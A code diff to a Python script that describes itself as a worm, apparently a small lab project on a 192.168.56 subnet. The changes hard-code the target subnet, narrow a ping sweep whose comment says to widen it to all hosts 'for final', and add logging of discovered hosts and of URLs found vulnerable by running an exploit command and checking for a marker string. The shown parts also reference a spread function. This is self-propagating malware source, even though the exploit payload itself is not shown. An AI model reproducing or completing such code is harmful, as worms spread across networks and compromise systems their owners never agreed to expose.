@@ -1,8 +1,5 @@
 #!/usr/bin/env python3
 
-# To be able to run the worm initially from your computer, do this:
-# mkdir /tmp/.dirt
-
 import os, sys, subprocess
 import base64
 from datetime import datetime
@@ -104,12 +101,13 @@ def spread(targets):
 # TODO: Identify subnet and adjust scan for different subnets
 def local_ip_finder():
 	local_ips = []
-	subprocess.run(f"ifconfig | grep inet | head -n 1 | cut -d \" \" -f10 | cut -d \".\" -f1-3 > {folder}/ip.txt", shell=True)
+	#subprocess.run(f"ifconfig | grep inet | head -n 1 | cut -d \" \" -f10 | cut -d \".\" -f1-3 > {folder}/ip.txt", shell=True)
+	subprocess.run(f"echo 192.168.56 > {folder}/ip.txt", shell=True)
 	part_local_ip = open(f"{folder}/ip.txt", "r").read().strip() # This will output an IP format of XXX.XXX.XXX
 
 	FNULL = open(os.devnull, 'w') # Hide output of ping
 
-	for x in range(128,136): # CHANGE THIS to 1,255 for final
+	for x in range(109,115): # CHANGE THIS to 1,255 for final
 		full_local_ip = part_local_ip + "." + str(x)
 		#for y in range(1,255): # If I want to search ip XXX.XXX.yyy.yyy
 		#	full_local_ip = subnet_local_ip + "." + str(y)
@@ -120,6 +118,10 @@ def local_ip_finder():
 			pass
 
 	FNULL.close()
+
+	f = open(f'{folder}/log','a')
+	f.write(f'Hosts Discovered: {local_ips}\n')
+	f.close()
 
 	return local_ips
 
@@ -139,6 +141,11 @@ def vuln_check(local_ips):
 			output = subprocess.getoutput(exploit)
 			if "123foo123" in str(output):
 				vuln_url_path.append(url)
+
+	f = open(f'{folder}/log','a')
+	f.write(f'Vulnerable URLs: {vuln_url_path}\n')
+	f.close()
+
 	return vuln_url_path #Final list of vuln urls
 
 def main():
